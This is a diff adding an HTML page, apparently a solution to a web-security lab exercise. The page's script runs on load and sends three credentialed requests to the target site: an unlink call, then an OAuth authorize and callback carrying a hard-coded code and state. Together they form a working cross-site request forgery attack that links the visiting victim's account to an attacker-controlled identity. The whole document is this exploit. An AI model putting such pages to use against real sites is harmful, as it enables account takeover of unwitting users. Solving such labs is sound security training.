@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+<script>
+(async ()=>{
+
+    
+    try {
+        await fetch("http://ptl-c0500a35-c549e685.libcurl.so/unlink", {
+            credentials: 'include'
+        })
+    }
+    catch(e) {
+        console.log("BB"+e);
+    }
+
+    try {
+        await fetch("http://ptl-c0500a35-c549e685.libcurl.so/users/auth/myprovider?state=059afa518fcc257aea2b30a7e6c517c4d438a6d2b255f8a2", {
+            credentials: 'include'
+        })
+    }
+    catch(e) {
+        console.log("BB"+e);
+    }
+    try {
+        await fetch("http://ptl-c0500a35-c549e685.libcurl.so/users/auth/myprovider/callback?code=0ca58c4e3b0b7569f43d87763da5ce115afe869383cca89832dfa92794490396&state=059afa518fcc257aea2b30a7e6c517c4d438a6d2b255f8a2", {
+            credentials: 'include'
+        })
+    }
+    catch(e) {
+        console.log("BB"+e);
+    }
+})();
+</script>
+  </body>
+</html>
